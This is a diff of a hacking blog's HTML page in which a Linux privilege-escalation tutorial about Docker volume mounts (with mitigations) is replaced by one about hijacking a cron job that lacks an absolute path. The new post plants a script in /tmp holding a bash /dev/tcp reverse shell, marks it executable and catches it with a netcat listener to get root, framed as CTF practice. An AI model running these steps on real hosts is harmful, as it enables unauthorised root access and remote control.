@@ -9,13 +9,13 @@
 
   
 
-  <title>Rooting with Docker Containers</title>
+  <title>Rooting with forgotten CronJobs</title>
 
   
   <meta name="author" content="Oriana Olivetti">
   
 
-  <meta name="description" content="How to take advantage of container creation to get root access on a host">
+  <meta name="description" content="How to take advantage of forgotten cronjobs to get root access on a host">
 
   
 
@@ -76,19 +76,19 @@
 
   
   <meta property="og:site_name" content="Hacking Diaries">
-  <meta property="og:title" content="Rooting with Docker Containers">
-  <meta property="og:description" content="How to take advantage of container creation to get root access on a host">
+  <meta property="og:title" content="Rooting with forgotten CronJobs">
+  <meta property="og:description" content="How to take advantage of forgotten cronjobs to get root access on a host">
 
   
-  <meta property="og:image" content="http://localhost:4000/assets/img/rooting-with-docker/cover.jpg">
+  <meta property="og:image" content="http://localhost:4000/assets/img/rooting-forgotten-cronjobs/cover.jpg">
   
 
   
   <meta property="og:type" content="article">
   <meta property="og:article:author" content="Oriana Olivetti">
-  <meta property="og:article:published_time" content="2023-02-23T00:00:00-05:00">
-  <meta property="og:url" content="http://localhost:4000/2023-02-23-rooting-with-docker/">
-  <link rel="canonical" href="http://localhost:4000/2023-02-23-rooting-with-docker/">
+  <meta property="og:article:published_time" content="2023-07-14T00:00:00-04:00">
+  <meta property="og:url" content="http://localhost:4000/2023-07-14-rooting-forgotten-cronjobs/">
+  <link rel="canonical" href="http://localhost:4000/2023-07-14-rooting-forgotten-cronjobs/">
   
 
   
@@ -97,11 +97,11 @@
   <meta name="twitter:site" content="@OlivettiOriana">
   <meta name="twitter:creator" content="@OlivettiOriana">
 
-  <meta property="twitter:title" content="Rooting with Docker Containers">
-  <meta property="twitter:description" content="How to take advantage of container creation to get root access on a host">
+  <meta property="twitter:title" content="Rooting with forgotten CronJobs">
+  <meta property="twitter:description" content="How to take advantage of forgotten cronjobs to get root access on a host">
 
   
-  <meta name="twitter:image" content="http://localhost:4000/assets/img/rooting-with-docker/cover.jpg">
+  <meta name="twitter:image" content="http://localhost:4000/assets/img/rooting-forgotten-cronjobs/cover.jpg">
   
 
   
@@ -246,7 +246,7 @@
     
     
       
-      data-img-src-1="http://localhost:4000/assets/img/rooting-with-docker/cover.jpg"
+      data-img-src-1="http://localhost:4000/assets/img/rooting-forgotten-cronjobs/cover.jpg"
     
     
     
@@ -260,15 +260,15 @@
     <div class="row">
       <div class="col-xl-8 offset-xl-2 col-lg-10 offset-lg-1">
         <div class="post-heading">
-          <h1>Rooting with Docker Containers</h1>
+          <h1>Rooting with forgotten CronJobs</h1>
           
             
-              <h2 class="post-subheading">How to take advantage of container creation to get root access on a host</h2>
+              <h2 class="post-subheading">How to take advantage of forgotten cronjobs to get root access on a host</h2>
             
           
 
           
-            <span class="post-meta">Posted on February 23, 2023</span>
+            <span class="post-meta">Posted on July 14, 2023</span>
             
             
           
@@ -284,15 +284,15 @@
     <div class="row">
       <div class="col-xl-8 offset-xl-2 col-lg-10 offset-lg-1">
         <div class="post-heading">
-          <h1>Rooting with Docker Containers</h1>
+          <h1>Rooting with forgotten CronJobs</h1>
           
             
-              <h2 class="post-subheading">How to take advantage of container creation to get root access on a host</h2>
+              <h2 class="post-subheading">How to take advantage of forgotten cronjobs to get root access on a host</h2>
             
           
 
           
-            <span class="post-meta">Posted on February 23, 2023</span>
+            <span class="post-meta">Posted on July 14, 2023</span>
             
             
           
@@ -316,54 +316,70 @@
       
 
       <article role="main" class="blog-post">
-        <p>Will you believe me if I tell you that Docker is a hacker? 
-Let me show you how to take advantage of Docker containers so you can access any high privilege file or perform any command as root.</p>
+        <p>As you might have guessed by the title, in this article, we will explore another scenario where we could take advantage of forgotten cronjobs to gain our precious root access. BUT FIRST, if you are new here, or missed the previous articles about this, don’t hesitate to pay a visit to <a href="https://https://orianaolivetti.github.io/2023-07-14-rooting-is-easy/">PART I</a> or <a href="https://orianaolivetti.github.io/2023-02-23-rooting-with-docker/">PART II</a>, totally worth it!</p>
 
-<p>To begin with, if you already know Docker, you might be aware that the processes inside each container are completely isolated from one another, however, they do share the same <strong>system’s kernel</strong>. And if you are new to Docker, now you know it, roughly.</p>
+<p>And now, focusing on the topic of today…</p>
 
-<p>The fun part starts now!, so if you want to follow along, feel free to duplicate the commands I’m about to show you. Hope you enjoy the ride!
-Let’s start by running a sample apache container, but we will put it to sleep for a while.</p>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>docker run -d alpine sleep 1d
+<p><strong>What are… cronjobs?</strong></p>
+
+<p>Well, “cron” stands for <strong>command run on notice</strong>, and yes! As it sounds like. A cronjob is a script that was scheduled to be executed periodically. 
+You can list your own cronjobs by typing <strong>crontab -l</strong> or checking the ones in the system by seeing what is inside the <strong>/etc/crontab</strong> file.</p>
+
+<p>Alright, I understand, but… how can this can help you get root access? If we are lucky enough, we will find a forgotten cronjob, which no longer exists, that we can modify to our advantage! 
+However, we need to have our fingers crossed so that we find a place where we have write permissions. More on that later! Don’t worry for now.</p>
+
+<p><strong>Let’s begin with the fun stuff</strong></p>
+
+<p>Oh no! What happened? For some reason I’m stuck as this low-privilege user called simba. Well… I’ll have to find a way to get root access as soon as possible so I can do important stuff!</p>
+
+<p>First, let’s see what cronjobs are available. Feel free to experiment alongside simba and type <strong>cat /etc/crontab</strong></p>
+
+<p><img src="/assets/img/rooting-forgotten-cronjobs/cron1.png" alt="Terminal" class="mx-auto d-block" /></p>
+
+<p>Here we have some interesting information. Let me explain…</p>
+<ol>
+  <li>We see that there are only 2 scripts running every minute, <strong>backup.sh</strong> and <strong>server_connect.py</strong></li>
+  <li>Both scripts are run with <strong>root</strong> permissions.</li>
+  <li>The <strong>first script</strong> is located in oriana’s home, so most probably we won’t have access to modify the contents of that particular script.</li>
+  <li>The <strong>second script</strong>, has no absolute path. When this happens, the crontab binary will look for the script in all locations listed on the <strong>PATH</strong> variable on top of the file.</li>
+</ol>
+
+<p>So… as you might be thinking, our salvation could be the server_connect.py script in case it is located somewhere we have write access to! Let’s check first if the script exists already.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find / -name server_connect.py 2&gt;/dev/null
 </code></pre></div></div>
-<p>Next I’m going to search for that process, to see its user.</p>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ps aux | grep sleep
+<p><img src="/assets/img/rooting-forgotten-cronjobs/cron2.png" alt="Terminal" class="mx-auto d-block" /></p>
+
+<p>This means the file does not exist. So we might be able to create it in one of the directories listed on <strong>PATH</strong>. Where could simba have write access? Have you guessed already?
+Of course! Everyone can write on the <strong>/tmp</strong> folder!. So now we could execute a reverse shell with root permissions.</p>
+
+<p><img src="/assets/img/rooting-forgotten-cronjobs/cron3.png" alt="Terminal" class="mx-auto d-block" /></p>
+
+<p>Simba will create then a server_connect.py script on the /tmp folder. In there, he added a bash script for executing a reverse shell. Yes, a bash script, because even though it used to by a python script, it is just the name of the file. That is why we declare the binary to execute on top.</p>
+
+<p>There you go, feel free to copy it! And replace it with your own ip and port for the reverse shell.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#!/bin/bash
+
+bash -i &gt;&amp; /dev/tcp/&lt;ip&gt;/&lt;port&gt; 0&gt;&amp;1
 </code></pre></div></div>
-<p><img src="/assets/img/rooting-with-docker/1.png" alt="Terminal" class="mx-auto d-block" /></p>
 
-<p>Mmm… weird, it says root, not oriana, but it must be the user running inside that container… right? 
-It’s surely matching the userid from inside the container with the userid that exists on the host machine. But the process inside the container is definetely running with a non-root user. It must be it!</p>
-
-<p>To clear doubts, let’s try another case, to make sure that everything works correctly.</p>
-
-<p>As root, I’ll create a secret file which is very sensitive, and change its permissions so only root will be authorized to see its content.</p>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>echo "secret" &gt; /tmp/supersecret.txt
-chmod 0600 /tmp/supersecret.txt
+<p>And don’t forget to give it execution access!!</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>chmod +x server_connect.py
 </code></pre></div></div>
-<p><img src="/assets/img/rooting-with-docker/2.png" alt="Terminal" class="mx-auto d-block" /></p>
+<p><img src="/assets/img/rooting-forgotten-cronjobs/cron4.png" alt="Terminal" class="mx-auto d-block" /></p>
 
-<p>We have our secret file ready, which can only we read and written by root. Meaning that no other user should be able to see it or modify it.</p>
+<p><strong>Are we ready now?</strong></p>
 
-<p>So now, this less privilege user called simba, (which happens to have the same name as my lovely cat), will create a container adding the directory /tmp as a volume. What will happen inside of it? 
-Simba won’t be able to open supersecret.txt, obviously, because he is not a root user. But stuborn as he is, he tries either way.</p>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>docker run -v /tmp:/tmp -it alpine sh
-</code></pre></div></div>
-<p><img src="/assets/img/rooting-with-docker/3.png" alt="Terminal" class="mx-auto d-block" /></p>
+<p>Almost there! We just need to start a listener on that same port, so the reverse shell can connect! Let’s type <strong>nc -nlvp 4444</strong>  on the console and wait…
+And after a minute, we got it! We got a reverse shell with root permissions!</p>
 
-<p>Wait, what? How was that possible? Was that some sort of witchcraft?</p>
+<p><img src="/assets/img/rooting-forgotten-cronjobs/cron5.png" alt="Terminal" class="mx-auto d-block" /></p>
 
-<p>Not really, but cool stuff isn’t it? This happens because docker daemons usually runs as root on the host system, meaning that every user capable of creating docker containers could revise or alter arbitrary files for which they don’t have permission. Provided that they can mount the directories as volumes, of course.</p>
+<p>Now we we are ready to do more hacking! Like reading sensitive files, or perform system-level actions. The sky is the limit!</p>
 
-<p>And then you realize, that most probably, your docker servers are vulnerable, that you need to warn your colleges.</p>
+<p><strong>Conclusion</strong></p>
 
-<p><strong>Now, how do we fix this?</strong></p>
-
-<p>You can make Docker to create user ids and group ids outside the ids range handled by the host system (outside 0-1000) by editing <strong>etc/docker/daemon.json</strong> and adding <strong>{“userns-remap”: “default”}</strong> to the contents on the file. This has some limitation, which you can read and learn more about it on Docker’s <a href="https://docs.docker.com/engine/security/userns-remap/">official documentation</a>. And then check the change did the trick by revising the <strong>/etc/subuid</strong> file.</p>
-
-<p><strong>IMPORTANT</strong>, note that by doing this, all your images and containers will be erased from the system because docker needs to update all the different ids.</p>
-
-<p>Other solution would be to configure the docker daemon as <strong>rootless</strong>, altough it has several dificulties and much more restrinctions, so make sure you understand what this means if your want to implement this rootless configuration on your system. You can learn more about it in <a href="https://docs.docker.com/engine/security/rootless/">here</a>.</p>
-
-<p>If you liked this post, and want to see Simba putting himself into trouble, make sure to follow me on Twitter and Linkedin, where I’ll update you whenever a new post comes out!</p>
+<p>From now on, you and simba know how to gain root access when some forgotten scripts are available to run as root periodically, due to security misconfigurations. 
+It is time to have fun and nplay some CTFs with this trick under our sleeve!</p>
 
 <p>Happy Hacking!</p>
 
@@ -373,13 +389,15 @@ Simba won’t be able to open supersecret.txt, obviously, because he is not a ro
         <div class="blog-tags">
           <span>Tags:</span>
           
-            <a href="/tags#docker">docker</a>
+            <a href="/tags#cronjob">cronjob</a>
           
             <a href="/tags#root">root</a>
           
             <a href="/tags#linux">linux</a>
           
             <a href="/tags#hack">hack</a>
+          
+            <a href="/tags#script">script</a>
           
         </div>
       
@@ -396,7 +414,7 @@ Simba won’t be able to open supersecret.txt, obviously, because he is not a ro
   <span class="sr-only">Share: </span>
 
   
-    <a href="https://twitter.com/intent/tweet?text=Rooting+with+Docker+Containers&url=http%3A%2F%2Flocalhost%3A4000%2F2023-02-23-rooting-with-docker%2F"
+    <a href="https://twitter.com/intent/tweet?text=Rooting+with+forgotten+CronJobs&url=http%3A%2F%2Flocalhost%3A4000%2F2023-07-14-rooting-forgotten-cronjobs%2F"
       class="btn btn-social-icon btn-twitter" title="Share on Twitter">
       <span class="fab fa-fw fa-twitter" aria-hidden="true"></span>
       <span class="sr-only">Twitter</span>
@@ -404,7 +422,7 @@ Simba won’t be able to open supersecret.txt, obviously, because he is not a ro
   
 
   
-    <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Flocalhost%3A4000%2F2023-02-23-rooting-with-docker%2F"
+    <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Flocalhost%3A4000%2F2023-07-14-rooting-forgotten-cronjobs%2F"
       class="btn btn-social-icon btn-facebook" title="Share on Facebook">
       <span class="fab fa-fw fa-facebook" aria-hidden="true"></span>
       <span class="sr-only">Facebook</span>
@@ -412,7 +430,7 @@ Simba won’t be able to open supersecret.txt, obviously, because he is not a ro
   
 
   
-    <a href="https://www.linkedin.com/shareArticle?mini=true&url=http%3A%2F%2Flocalhost%3A4000%2F2023-02-23-rooting-with-docker%2F"
+    <a href="https://www.linkedin.com/shareArticle?mini=true&url=http%3A%2F%2Flocalhost%3A4000%2F2023-07-14-rooting-forgotten-cronjobs%2F"
       class="btn btn-social-icon btn-linkedin" title="Share on LinkedIn">
       <span class="fab fa-fw fa-linkedin" aria-hidden="true"></span>
       <span class="sr-only">LinkedIn</span>
@@ -432,12 +450,12 @@ Simba won’t be able to open supersecret.txt, obviously, because he is not a ro
       <ul class="pagination blog-pager">
         
         <li class="page-item previous">
-          <a class="page-link" href="/2020-02-28-test-markdown/" data-toggle="tooltip" data-placement="top" title="Sample blog post">&larr; Previous Post</a>
+          <a class="page-link" href="/2023-02-23-rooting-with-docker/" data-toggle="tooltip" data-placement="top" title="Rooting with Docker Containers">&larr; Previous Post</a>
         </li>
         
         
         <li class="page-item next">
-          <a class="page-link" href="/2023-07-14-rooting-forgotten-cronjobs/" data-toggle="tooltip" data-placement="top" title="Rooting with forgotten CronJobs">Next Post &rarr;</a>
+          <a class="page-link" href="/2023-07-14-rooting-is-easy/" data-toggle="tooltip" data-placement="top" title="Getting root user access so easily? How come!">Next Post &rarr;</a>
         </li>
         
       </ul>
